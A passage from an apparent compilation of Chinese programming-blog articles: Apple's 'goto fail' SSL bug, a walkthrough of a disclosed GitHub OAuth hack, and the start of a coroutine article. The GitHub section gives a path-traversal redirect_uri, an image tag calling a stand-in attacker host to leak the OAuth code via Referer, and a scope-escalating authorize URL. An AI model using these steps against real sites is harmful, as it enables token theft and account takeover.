[图片来源](http://tydligapp.com/images/screenshots/1-physics.png) 和 [官方网站](http://tydligapp.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_tydlig_01.png)![img]()

#### UDK

[图片来源](https://www.youtube.com/watch?v=0OR63rDN5p8) 和 [官方网站](http://www.unrealengine.com/en/udk/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_udk_01.png)![img]()

#### Visual JForex

[图片来源](https://i1.ytimg.com/vi/iz5numHchGU/maxresdefault.jpg) 和 [官方网站](http://www.dukascopy.com/swiss/english/forex/Visual/features/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_jforex_01.jpg)![img]()

#### VUO

[图片来源](http://www.vjunion.se/2013/03/a-great-start-to-the-new-year/) 和 [官方网站](http://vuo.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_vuo_01.png)![img]()

#### VVVV

[图片来源 1](http://vvvv.org/contribution/vvvv.packs.image), [图片来源 2](http://kristiansmusicproductionblog.com/wp-content/uploads/vvvv.png), [Wikipedia](https://en.wikipedia.org/wiki/Vvvv) 和 [官方网站](http://www.vvvv.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_vvvv_01.png)![img]()

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_vvvv_02.png)![img]()

#### Windows Workflow Foundation

[图片来源](http://fryerblog.com/post/2179029238/a-windows-workflow-foundation-example), [Wikipedia](https://en.wikipedia.org/wiki/Windows_Workflow_Foundation) 和 [官方网站](http://msdn.microsoft.com/en-us/vstudio/jj684582.aspx)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_winworkflow_01.png)![img]()

（全文完）

# 由苹果的低级BUG想到的

#####  [2014年02月24日 ](https://coolshell.cn/articles/11112.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [116 条评论](https://coolshell.cn/articles/11112.html#comments) 111,221 人阅读

![img](photo/apple_goto_fail.png)2014年2月22日，在这个“这么二”的日子里，苹果公司推送了 iOS 7.0.6（版本号11B651）修复了 SSL 连接验证的一个 bug。官方网页在这里：http://support.apple.com/kb/HT6147，网页中如下描述：

> **Impact**: An attacker with a privileged network position may capture or modify data in sessions protected by SSL/TLS
>
> **Description**: Secure Transport failed to validate the authenticity of the connection. This issue was addressed by restoring missing validation steps.

也就是说，这个bug会引起中间人攻击，bug的描述中说，这个问题是因为miss了对连接认证的合法性检查的步骤。

这里多说一句，**一旦网上发生任何的和SSL/TL相关的bug或安全问题，不管是做为用户，还是做为程序员的你，你一定要高度重视起来**。因为这个网络通信的加密协议被广泛的应用在很多很多最最需要安全的地方，如果SSL/TLS有问题的话，意味着这个世界的计算机安全体系的崩溃。

目录



[Bug的代码原因](https://coolshell.cn/articles/11112.html#Bug的代码原因)[一些思考](https://coolshell.cn/articles/11112.html#一些思考)[0）关于编译报警](https://coolshell.cn/articles/11112.html#0）关于编译报警)[1）关于Code Merge 和 Code Review](https://coolshell.cn/articles/11112.html#1）关于Code_Merge_和_Code_Review)[2）关于测试](https://coolshell.cn/articles/11112.html#2）关于测试)[3）关于编码风格](https://coolshell.cn/articles/11112.html#3）关于编码风格)[4）关于goto语句](https://coolshell.cn/articles/11112.html#4）关于goto语句)[总结](https://coolshell.cn/articles/11112.html#总结)

#### Bug的代码原因

Adam Langley的《[Apple’s SSL/TLS bug](https://www.imperialviolet.org/2014/02/22/applebug.html) 》的博文暴出了这个bug的细节。（在苹果的开源网站上，通过查看苹果的和SSL/TLS有关的代码变更，我们可以在文件[sslKeyExchange.c](http://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c)中找到下面的代码）



**static** OSStatus

SSLVerifySignedServerKeyExchange(SSLContext *ctx, **bool** isRsa, SSLBuffer signedParams,

​                                 **uint8_t** *signature, UInt16 signatureLen)

{

  OSStatus        err;

  ...

  **if** ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)

​    **goto** fail;

  **if** ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)

​    **goto** fail;

​    **goto** fail;

  **if** ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)

​    **goto** fail;

  err = sslRawVerify(ctx,

​                       ctx->peerPubKey,

​                       dataToSign,        /* plaintext */

​                       dataToSignLen,      /* plaintext length */

​                       signature,

​                       signatureLen);

  **if**(err) {

​    sslErrorLog("SSLDecodeSignedServerKeyExchange: sslRawVerify "

​                    "returned %d\n", (**int**)err);

​    **goto** fail;

  }

fail:

​    SSLFreeBuffer(&signedHashes);

​    SSLFreeBuffer(&hashCtx);

​    **return** err;

}

注意，我高亮的地方，也就是那里有两个goto fail; 因为if语句没有加大括号，所以，只有第一个goto是属于if的，而第二个goto则是永远都会被执行到的（注：这里不是Python是C语言，缩进不代表这个语句属于同一个语句块）。也就是说，就算是前面的if检查都失败了（err  == 0），也会goto fail。我们可以看到fail标签中释放完内存后就会return err;

你想一下，**这段程序在SSLHashSHA1.update()  返回成功，也就是返回0 的时候会发生什么样的事？是的，真正干活的 sslRawVerify()被bypass了。而且这个函数SSLVerifySignedServerKeyExchange() 还返回了0，也就是成功了！**尼玛！你可能想到酷壳网上之前《[一个空格引发的惨剧](https://coolshell.cn/articles/4875.html)》的文章。都是低级bug。

这个低级bug在这个周末在网上被炒翻了天，你可以**[上Twiter上看看#gotofail的标签的盛况](https://twitter.com/search?q=%23gotofail)**。**Goto Fail必然会成为历史上的一个经典事件**。

如果你喜欢XKCD，你一定会想到这个漫画：

![img](https://sslimgs.xkcd.com/comics/goto.png)

**注意**：这个bug不会影响TLS 1.2版本，因为1.2版本不会用这个函数，走的是另一套机制。但是别忘了client端是可以选择版本的。

如果你想测试一下你的浏览器是否会有问题，**你可以上一下当天就上线的[ https://gotofail.com](https://gotofail.com/) 网站**

#### 一些思考

下面是我对这个问题的一些思考。

##### 0）关于编译报警

有人在说苹果的这个代码中的goto语句会产生死代码——dead code，也就是永远都不会执行到的代码，C/C++的编程器是会报警的。但，实际上，dead code在默认上的不会报警的。即使你加上-Wall，GCC 4.8.2 或 Clang 3.3 都不会报警，包括Visual Studio 2012在默认的报警级别也不会（默认是/W3级，需要上升到/W4级以上，但是升级到/W4上，你的工程可能会有N多的Warning，你不一定能看得过来）。gcc和Clang有一个参数叫：-Wunreachable-code，是可以对这种情况报警的，但即没有被包括在-Wall里。原因是，这个参数有很多的问题，因为编译器的优化代码的行为，这个参数并不能对每种情况都准确地报告。另请注意，GCC的新版本中剔除了这个参数。当然，其它一些静态的代码检查工具也可以检查这个低级的问题。

另外，是不是用IDE的代码自动化格式工具也可以帮上一点忙呢？至少可以把那个缩进变成让人一看就觉得有问题。

##### 1）关于Code Merge 和 Code Review

你可以通过这里的代码比较看到这个bug的diff，也可以到[这里看看](https://gist.github.com/alexyakoubian/9151610/revisions)（631行）。

> diff -urN <(curl -s http://opensource.apple.com/source/Security/Security-55179.13/libsecurity_ssl/lib/sslKeyExchange.c\?txt) \ <(curl -s http://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c\?txt) \

通过code diff你可以看到，**苹果公司是在重构代码——为很多函数去掉了ctx的参数**。

所以，我们可以猜测，两个goto fail语句，可能是因为对code在不同branch上做merge发生的。版本工具merge代码的时候，经常性的会出现这样的问题。如果代码的diff很多，这个问题会很容易就没有注意到。就算有code review，这个有问题的代码也很难被找出来的。**如果你来review下面的diff，你会注意到这个错误吗？**

![img](photo/gotofail.jpg)

也就是说，在重构分支上的代码是对的，但是在分支merge的时候，被merge工具搞乱了。所以说，**我们在做code merge的时候，一定要小心小心再小心，不能完全相信merge工具**。

##### 2）关于测试

很明显，这个bug很难被code review发现。对于重构代码和代码merge里众多的diff，是很难被review的。

当然，“事后诸葛亮”的人们总是很容易地说这个问题可以被测试发现，但是实际情况是这样的吗？

这个问题也很难被功能测试发现，因为这个函数在是在网络握手里很深的地方，功能 测试不一定能覆盖得那么深，你要写这样的case，必需对TLS的协议栈非常熟悉，熟悉到对他所有的参数都很熟悉，并能写出针对每一个参数以及这些参数的组合做一堆test case，这个事情也是一件很复杂的事。要写出所有的case本身就是一件很难很难的事情。关于这个叫SSLVerifySignedServerKeyExchange()函数的细节，你可以看看相关的[ServerKeyExchange](https://tools.ietf.org/html/rfc5246#section-7.4.3) RFC文档。

如果只看这个问题的话，你会说对这个函数做的 Unit Test 可以发现这个问题，是的。但是，别忘了SSL/TLS这么多年了，这些基础函数都应该是很稳定的了， 在事前，我们可能不会想到要去为这些稳定了多少年的函数写几个Unit Test。

**只要有足够多的时间，我们是可以对所有的功能点，所有的函数都做UT，也可以去追求做代码覆盖和分支覆盖一样。但有一点我们却永远无法做到，那就是——穷举所有的负面案例**。所以，对于测试来说，我们不能走极端，需要更聪明的测试。就像我在《[我们需要专职的QA](https://coolshell.cn/articles/6994.html)》文章里的说过的——**测试比coding难度大多了，测试这个工作只有高级的开发人员才做得好。我从来不相信不写代码的人能做好测试。**

这里，**我并不是说通过测试来发现这个问题的可能性不大，我想说的是，测试很重要，单测更重要。但是，我们无法面面俱到**。在我们没有关注到的地方，总会发生愚蠢的错误。

P.S.，在各大网站对这个事的讨论中，我们可以看到OS X下的curl命令居然可以接受一个没有验证过的IP地址的https的请求，虽然现在还没有人知道这事的原因，但是，这可能是没有在测试中查到的一个原因。

##### 3）关于编码风格

对于程序员来说，在C语言中，省掉语句大括号是一件非常不明智 的事情。如我们强制使用语句块括号，那么，这两个goto fail都会在一个if的语句块里，而且也容易维护并且易读。（另外，通过这个bug，我们可以感受到，像Python那样，用缩进来表示语句块，的确是挺好的一件事）

也有人说，如果你硬要用只有单条语句，且不用语句块括号，那么，这就是一条语句，应该放在同一行上。如下所示：



**if**  (check_something)   do_something(); 



但是这样一来，你在单步调试代码的时候，就有点不爽了，当你step over的时候，你完全不知道if的条件是真还是假。所以，还是分多行，加上大括号会好一些。

相似的问题，我很十多年前也犯过，而且那次我出的问题也比较大，导致了用户的数据出错。那次就是维护别人的代码，别人的代码就是没有if的语句块括号，就像苹果的代码那样。我想在return z之前调用一个函数，结果就杯具了：

**if** ( ...... )

​    **return** x;

**if** ( ...... )

​    **return** y;

**if** ( ...... )

​    foo();

​    **return** z;

这个错误一不小心就犯了，因为人的大脑会相当然地认为缩进的都是一个语句块里的。但是如果原来的代码都加上了大括号，然后把缩进做正常，那么对后面维护的人会是一个非常好的事情。就不会犯我这个低级错误了。就像下面的代码一样，虽然写起来有点罗嗦，但利人利己。

**if** ( ...... ){

​    **return** x;

}

**if** ( ...... ){

​    **return** y;

}

**if** ( ...... ){

​    **return** z;

}

与此类似的代码风格还有如下，你觉得哪个更容易阅读呢？

- if (!p)   和  if (p == NULL)

- if (p)   和  if (p != NULL)

- if (!bflag)  和 if  (bflag == false)

- if ( CheckSomthing() )  和 if ( CheckSomething() == true )

另外还有很多人在switch 语句里用case来做if，也就是说case后面没有break。就像[Duff’s Device](https://en.wikipedia.org/wiki/Duff's_device)一样，再配以goto，代码就写得相当精彩了（这里[有个例子](https://github.com/agentzh/luajit2/blob/master/src/host/buildvm.c#L395)）

所以说，代码不是炫酷的地方是给别人读的。

另外，我在想，为什么苹果的这段代码不写成下面这样的形式？你看，下面这种情况不也很干净吗？

**if** (  ((err = ReadyHash(&SSLHashSHA1, &hashCtx)) != 0 )

​       || ((err = SSLHashSHA1.update(&hashCtx, &clientRandom)) != 0)

​       || ((err = SSLHashSHA1.update(&hashCtx, &serverRandom) != 0)

​       || ((err = SSLHashSHA1.update(&hashCtx, &signedParams) != 0)

​       || ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)) {

​     **goto** fail;

}

其实，还可以做一些代码上的优化，比如，把fail标签里的那些东西写成一个宏，这样就可以去掉goto语句了。

##### 4）关于goto语句

关于goto语句，1968年，[Edsger Dijkstra](https://en.wikipedia.org/wiki/Edsger_Dijkstra) 投了一篇文章到Communications of the ACM。原本的标题是《A Case Against the Goto Statement》。CACM编辑[Niklaus Wirth](https://en.wikipedia.org/wiki/Niklaus_Wirth)灵感来了，把标题改为我们熟知的 《[Go To Statement Considered Harmful](http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html)》Dijkstra写的内容也是其一贯的犀利语气，文中说：“几年前我就观察到，一个程序员的品质是其程序中goto语句的密度成反比的”，他还说，“后来我发现了为什么goto语句的使用有这么严重的后果，并相信所有高级语言都应该把goto废除掉。”  （**花絮**：因为，这篇文章的出现，计算学界开始用’ [X considered harmful](https://en.wikipedia.org/wiki/Considered_harmful) ‘当文章标题的风潮，直到[有人终于受不了](http://meyerweb.com/eric/comment/chech.html)为止）

为什么goto语句不好呢？Dijkstra说，一个变量代表什么意义要看其上下文。一个程序用N``记录房间里的人数，在大部分时候，N``代表的是“目前房间里的人”。但在观察到又有一个人进房间后、把N``递增的指令前的这段程序区块中，N``的值代表的是“目前房间里的人数加一”。因此，要正确诠释程序的状态，必须知道程序执行的历史，或着说，知道现在“算到哪”了。

怎么谈“算到哪了”？如果是一直线执行下来的程序，我们只要指到那条语句，说“就是这里”，就可以了。如果是有循环程序，我们可能得说：“现在在循环的这个地方，循环已经执行了第`i`次”。如果是在函数中，我们可能得说：“现在执行到函数`p`的这一点；`p`刚刚被`q调用`，调用点在一个循环中，这个循环已经执行了`i`次”。

如果有goto`语句了`呢？那就麻烦了。因为电脑在执行某个指令前，可能是从程序中许许多多goto``其中之一跳过来的。要谈某变量的性质也几乎变得不可能了。这就是为什么goto语句问题。

Dijkstra的这篇文章对后面很多程序员有非常深的影响，包括我在内，都觉得Goto语句能不用就不用，虽然，我在十年前的《[编程修养](http://blog.csdn.net/haoel/article/month/2003/05)》（这篇文章已经严重过时，某些条目已经漏洞百出）中的[第23条](http://blog.csdn.net/haoel/article/details/2876)也说过，我只认为在goto语句只有一种情况可以使用，就是苹果这个bug里的用法。但是我也同意Dijkstra，goto语句能不用就不用了。就苹果的这个问题而言，在更为高级的C++中，[使用RAII技术](https://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization)，这样的goto语句已经没有什么存在的意义了。

Dijkstra这篇文章后来成为结构化程式论战最有名的文章之一。长达19年之后，Frank Rubin投了一篇文章到CACM,标题为《[‘ ``Go To Considered Harmful’ Considered Harmful](http://www.ecn.purdue.edu/ParaMount/papers/rubin87goto.pdf) 》Rubin说，「虽然Dijkstra的说法既太学术又缺乏说服力」，却似乎烙到每个程序员的心里了。这样，当有人说“用goto语句来解这题可能会比较好”会被严重鄙视。于是Rubin出了一道这样的题：令`X`为`N * N`的整数阵列。如果`X`的第`i`行全都是零，请输出`i`。如果不只一行，输出最小的`i` .

Rubin找了一些惯用goto和不用goto的程序员来解题，发现用goto的程序又快又清楚。而不用goto通常花了更多的时间，写出很复杂的解答。你觉得呢？ 另外，你会怎么写这题的程序呢？

（**花絮**：以后几个月的CACM热闹死了。编辑收到许多回应，两个月后刊出了其中五篇。文章也包括了《[“‘GOTO Considered Harmful’ Considered Harmful” Considered Harmful?](http://www.ecn.purdue.edu/ParaMount/papers/acm_may87.pdf) 》）

**对于我而言，goto语句的弊远远大于利，在99%的情况下，我是站在反goto这边的**。Java和Python就没有提供Goto语句，原因就是因为goto语句很容易被滥用！

**更新：2014年3月5日** – RedHat 近日也发现个GnuTLS安全问题，与苹果的类似：无法正确检验特定的伪造SSL证书，这个总是会将伪造证书识别为有效证书。虽然Redhat的代码为if加上了花括号，但还是因为没有控制好goto，造成了bug。所以说啊，goto语句的坑是很多。

- BUG页面：https://bugzilla.redhat.com/show_bug.cgi?id=1069865

- 相关的Diff: https://bugzilla.redhat.com/attachment.cgi?id=867911&action=diff

goto语句在写代码的时候也许你会很爽，但是在维护的时候，绝对是一堆坑！redhat的这个patch为原来本来只有一个label的goto又加了另一个label，现在两个label交差goto，继续挖坑……

#### 总结

你看，我们不能完全消灭问题，但是，我们可以用下面几个手段来减少问题：

1）**尽量在编译上发生错误，而不是在运行时**。

2）**代码是让人读的，顺便让机器运行**。不要怕麻烦，好的代码风格，易读的代码会减少很多问题。

3）**Code Review是一件很严肃的事情**，但 Code Reivew的前提条件是代码的可读性一定要很好。

4）**测试是一件很重要也是很难的事情，尤其是开发人员要非常重视**。

5）**不要走飞线，用飞线来解决问题是可耻的！**所以，用goto语句来组织代码的时代过去了，你可以有很多种方式不用goto也可以把代码组织得很好。

最后，我在淘宝过去的一年里，经历过一些P1/P2故障，尤其是去年的8-9月份故障频发的月份，我发现其中有70%的P1/P2故障，就是因为没有code review，没有做好测试，大量地用飞线来解决问题，归根结底就是只重业务结果，对技术没有应有的严谨的态度和敬畏之心。

**正如苹果的这个“goto fail”事件所暗喻的，如果你对技术没有应有的严谨和敬畏之心，你一定会——**

**Go To Fail !!!**

在这里唠叨这么多，与大家共勉！

（全文完）

# 从“黑掉GITHUB”学WEB安全开发

#####  [2014年02月10日 ](https://coolshell.cn/articles/11021.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [61 条评论](https://coolshell.cn/articles/11021.html#comments) 101,077 人阅读

![img](photo/Github-Security.png)Egor Homakov（Twitter: [@homakov](https://twitter.com/homakov) 个人网站: [EgorHomakov.com](http://egorhomakov.com/)）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《[How I hacked Github again](https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html)》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，**我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕**。关于Web开发中的安全事项，大家可以看看这篇文章《[Web开发中的你需要了解的东西](https://coolshell.cn/articles/6043.html)》

目录



[OAuth简介](https://coolshell.cn/articles/11021.html#OAuth简介)[OAuth的Callback](https://coolshell.cn/articles/11021.html#OAuth的Callback)[第一个Bug — 没有检查重定向URL中的/../](https://coolshell.cn/articles/11021.html#第一个Bug_—_没有检查重定向URL中的)[第二个BUG — 没有校验token](https://coolshell.cn/articles/11021.html#第二个BUG_—_没有校验token)[第三个BUG — 注入跨站图片](https://coolshell.cn/articles/11021.html#第三个BUG_—_注入跨站图片)[像程序员一样的思考](https://coolshell.cn/articles/11021.html#像程序员一样的思考)[第四个bug – Gist把github_token放在了cookie里](https://coolshell.cn/articles/11021.html#第四个bug_–_Gist把github_token放在了cookie里)[第五个Bug – 自动给gist授权](https://coolshell.cn/articles/11021.html#第五个Bug_–_自动给gist授权)[ 其它 & 感想](https://coolshell.cn/articles/11021.html#_其它_感想)

#### OAuth简介

首先，这个故事要从[Github OAuth](https://developer.github.com/v3/oauth/)讲起。所以，我们需要先知道什么是[OAuth](https://en.wikipedia.org/wiki/OAuth)。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。



![img](photo/oauth-authentication.png)

从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。

#### OAuth的Callback

还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。

你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。

知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。

#### 第一个Bug — 没有检查重定向URL中的/../

首先，我们通过[Github的 redirect_uri 的说明文档](https://developer.github.com/v3/oauth/#redirect-urls)我们可以看到这样的说明：

```
如果 CALLBACK URL是: http://example.com/path

GOOD: https://example.com/path
GOOD: http://example.com/path/subdir/other

BAD: http://example.com/bar
BAD: http://example.com/
BAD: http://example.com:8080/path
BAD: http://oauth.example.com:8080/path
BAD: http://example.org
```

而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。

但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。

于是，Egor相当于构造了一个下面这样的Redirect URL：

```
https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE
```

于是上面的URL就相当于：

```
https://gist.github.com/homakov/8820324?code=CODE
```

你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。

#### 第二个BUG — 没有校验token

第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。

这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。

也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。

#### 第三个BUG — 注入跨站图片

现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：

```
https://gist.github.com/homakov/8820324?code=CODE
```

但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。

到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：

<a href=http://hack.you.com/>私人照片</a>

这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。

但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。

不过，我们可以用一个很诡异的技巧：

<img src=”///attackersite.com”>

这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。

##### 像程序员一样的思考

这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，

- 对于绝对路径：你会匹配两个//，后面的可能会是 user@host.com（user@是可选的），然后可能会有:<n>端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。

- 对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。

好了，如果coolshell.cn网页中的<img src=>或<a href=>中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。

但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：

[CoolShell Test](https://www.google.com/)

<a href="///www.google.com">CoolShell Test</a>

关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。

于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。

到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。

#### 第四个bug – Gist把github_token放在了cookie里

于是Egor在用户的cookie里找到了 github_token

![img](photo/gist_cookie.png)

但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《[Web开发中的你需要了解的东西](https://coolshell.cn/articles/6043.html)》）。

于是，Egor只能另谋出路。

#### 第五个Bug – 自动给gist授权

因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）

https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%**2Fcallback/../../../homakov/8820324**&response_type=code&**scope=repo,gists,user,delete_repo,notifications**

于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。

####  其它 & 感想

于是，作者从 [Github Security Bug Bounty](https://bounty.github.com/) 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。

下图是Github上的赏金猎手的排行榜（https://bounty.github.com/index.html#leaderboard）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。

![img](photo/github_bounty_leaderboard.jpg)

让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。**老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率**——你可以移步看看我写的《[加班与效率](https://coolshell.cn/articles/10217.html)》

（全文完）

# 一个“蝇量级” C 语言协程库

#####  [2014年01月28日 ](https://coolshell.cn/articles/10975.html) [Leo](https://coolshell.cn/articles/author/full_of_bull) 评论 [54 条评论](https://coolshell.cn/articles/10975.html#comments) 108,933 人阅读

**（感谢网友** [**@我的上铺叫路遥**](http://weibo.com/fullofbull) **投稿）**

协程(coroutine)顾名思义就是“协作的例程”（co-operative routines）。跟具有操作系统概念的线程不一样，协程是在用户空间利用程序语言的语法语义就能实现逻辑上类似多任务的编程技巧。实际上协程的概念比线程还要早，按照 Knuth 的说法**“子例程是协程的特例”**，一个子例程就是一次子函数调用，那么实际上协程就是类函数一样的程序组件，你可以在一个线程里面轻松创建数十万个协程，就像数十万次函数调用一样。只不过子例程只有一个调用入口起始点，返回之后就结束了，而协程入口既可以是起始点，又可以从上一个返回点继续执行，也就是说协程之间可以通过 yield 方式转移执行权，**对称（symmetric）、平级**地调用对方，而不是像例程那样上下级调用关系。当然 Knuth 的“特例”指的是协程也可以模拟例程那样实现上下级调用关系，这就叫**非对称协程**（asymmetric coroutines）。

目录



[基于事件驱动模型](https://coolshell.cn/articles/10975.html#基于事件驱动模型)[“蝇量级”的协程库](https://coolshell.cn/articles/10975.html#“蝇量级”的协程库)[C 语言的“yield 语义”](https://coolshell.cn/articles/10975.html#C_语言的“yield_语义”)[Protothreads的上下文](https://coolshell.cn/articles/10975.html#Protothreads的上下文)[Protothreads的原语和组件](https://coolshell.cn/articles/10975.html#Protothreads的原语和组件)[Protothreads实战](https://coolshell.cn/articles/10975.html#Protothreads实战)[协程库 DIY 攻略](https://coolshell.cn/articles/10975.html#协程库_DIY_攻略)

#### 基于事件驱动模型

我们举一个例子来看看一种**对称协程**调用场景，大家最熟悉的“生产者-消费者”事件驱动模型，一个协程负责生产产品并将它们加入队列，另一个负责从队列中取出产品并使用它。为了提高效率，你想一次增加或删除多个产品。伪代码可以是这样的：

\# producer coroutine

loop

**while** queue is not full

  create some new items

  add the items to queue

yield to consumer

\# consumer coroutine

loop

**while** queue is not empty

  remove some items from queue

  use the items

yield to producer



大多数教材上拿这种模型作为多线程的例子，实际上多线程在此的应用还是显得有点“重量级”，由于缺乏 yield 语义，线程之间不得不使用同步机制来避免产生全局资源的竟态，这就不可避免产生了休眠、调度、切换上下文一类的系统开销，而且线程调度还会产生时序上的不确定性。而对于协程来说，“挂起”的概念只不过是转让代码执行权并调用另外的协程，待到转让的协程告一段落后重新得到调用并从挂起点“唤醒”，这种协程间的调用是逻辑上可控的，时序上确定的，可谓一切尽在掌握中。

